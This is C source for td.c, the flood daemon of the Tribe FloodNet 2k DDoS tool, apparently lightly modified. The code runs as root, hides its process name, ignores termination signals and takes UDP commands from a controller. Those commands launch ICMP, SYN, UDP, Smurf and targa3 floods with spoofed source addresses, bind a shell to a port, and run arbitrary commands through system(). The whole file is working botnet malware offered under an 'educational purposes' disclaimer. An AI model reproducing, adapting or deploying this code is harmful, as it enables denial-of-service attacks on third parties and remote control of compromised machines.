/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * td.c - tribe flood server
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#include "tribe.h"

#define DAEMON_PORT   8000

extern int fw00ding, nospoof, port4syn, psize;
extern unsigned int myip;
char controlip[16];
char buf[20];
extern void security_through_obscurity (int);

void tribe_cmd (char, char *, char **);
pthread_t pthread_id;

int
main (int argc, char **argv)
{
  struct tribe *tribeh = (struct tribe *) buf;
  char *data = (buf + sizeof (struct tribe));
  fd_set rfds;
  int udpsock = socket (AF_INET, SOCK_DGRAM, 0);
  struct sockaddr_in ser_addr;
  memset(&ser_addr,0,sizeof(ser_addr));
  uid_t uid;
  ser_addr.sin_port   = htons(9997);
  ser_addr.sin_addr.s_addr = htons(INADDR_ANY);
  if (bind(udpsock ,(struct sockaddr *)&ser_addr ,sizeof(ser_addr))<0) {
    printf("bind error\n");
    exit(-1);
  }

  struct sockaddr_in cli_addr;
  socklen_t addrlen;
  memset(&cli_addr,0,sizeof(cli_addr));

  uid = geteuid ();
  if (uid) {
    printf("uid = %ld\n", uid);
    exit (-1);
  }


  memset (argv[0], 0, strlen (argv[0]));
  strcpy (argv[0], HIDEME);
  #if 0
  close (0);
  close (1);
  close (2);
  #endif
#ifndef WINDOZE
  if (fork ()) {
    //parent process exit
    exit (0);
  }
#else
  switch (fork ())
    {
    case -1:
      perror ("fork");
      exit (0);
      break;
    case 0:
      break;
    default:
      break;
    }
#endif
  /* child process */
  signal (SIGHUP, SIG_IGN);
  signal (SIGTERM, SIG_IGN);
  signal (SIGCHLD, SIG_IGN);
	while(1)
	{
		FD_ZERO(&rfds);
		FD_SET (udpsock, &rfds);
		if (select (udpsock + 1, &rfds, NULL, NULL, NULL) < 1)
			continue;
		if (FD_ISSET (udpsock, &rfds))
		{
			int ret = recvfrom(udpsock, buf ,sizeof(buf), 0,(struct sockaddr *)&cli_addr, &addrlen);
			if ((tribeh->start == PROTO_SEP) && (tribeh->end == PROTO_SEP))
			{
				strcpy(controlip,inet_ntoa(cli_addr.sin_addr));
	    			tribe_cmd (tribeh->id, (char *)data, argv);
				memset(buf,0,sizeof(buf));
			}
		}
	}
  return (0);
}

void
tribe_cmd (char id, char *target, char **argp)
{
#ifdef ATTACKLOG
  {
    char tmp[BS];
    sprintf (tmp, "PID %d CMD '%c' TARGET %s\n"
	     ,getpid (), id, target);
    dbug (tmp);
  }
#endif
  switch (id)
    {
      printf("tribe_cmdcontrolipbefore:%s\n",controlip);
    case ID_ICMP:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 3;		/* commencing ICMP/8 flood */
      strcpy (argp[0], HIDEKIDS);
      createShm();
      udpConnect(DAEMON_PORT, controlip);
      commence_icmp (target);
      strcpy (argp[0], HIDEME);
      if(pthread_create(&pthread_id,NULL,thread_send,(void *)0) !=0)
      {
	printf("pthread failed");
      }
      break;
    case ID_SMURF:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 4;		/* commencing SMURF broadcast flood */
      strcpy (argp[0], HIDEKIDS);
      commence_smurf (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_SENDUDP:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 1;		/* commencing UDP flood */
      strcpy (argp[0], HIDEKIDS);
      createShm();
      udpConnect(DAEMON_PORT,controlip);
      commence_udp (target);
      strcpy (argp[0], HIDEME);
      if(pthread_create(&pthread_id,NULL,thread_send,(void *)0) !=0)
      {
	printf("pthread failed");
      }
      break;
    case ID_SENDSYN:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 2;		/* commencing SYN flood */
      strcpy (argp[0], HIDEKIDS);
      createShm();
      udpConnect(DAEMON_PORT, controlip);
      commence_syn (target, port4syn);
      strcpy (argp[0], HIDEME);
      if(pthread_create(&pthread_id,NULL,thread_send,(void *)0) !=0)
      {
	printf("pthread failed");
      }
      break;
    case ID_STOPIT:
      if (!fw00ding)		/* this has no longer a meaning */
	break;
      must_kill_all ();		/* all flood childs terminating */
      usleep (100);
      fw00ding = 0;
      isRun = 0;
      close(socket_fd);
      break;
    case ID_SYNPORT:
      port4syn = atoi (target);	/* syn port set */
      break;
    case ID_PSIZE:
      psize = atoi (target);	/* new packet size */
      break;
    case ID_SWITCH:
      switch (atoi (target))
	{
	case 0:
	  nospoof = 0;		/* spoof mask: *.*.*.* */
	  break;
	case 1:
	  nospoof = 1;		/* spoof mask: real.*.*.* */
	  break;
	case 2:
	  nospoof = 2;		/* spoof mask: real.real.*.* */
	  break;
	case 3:
	  nospoof = 3;		/* spoof mask: real.real.real.* */
	  break;
	default:
	  break;
	}
      break;
    case ID_SHELL:
      shellsex (atoi (target));	/* shell bound to target port */
      break;
    case ID_TARGA:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 4;		/* commencing targa3 attack */
      strcpy (argp[0], HIDEKIDS);
      commence_targa3 (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_MIX:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 5;		/* commencing interval flood */
      strcpy (argp[0], HIDEKIDS);
      commence_mix (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_REXEC:
      system (target);
      break;
    default:
      break;
    }
}
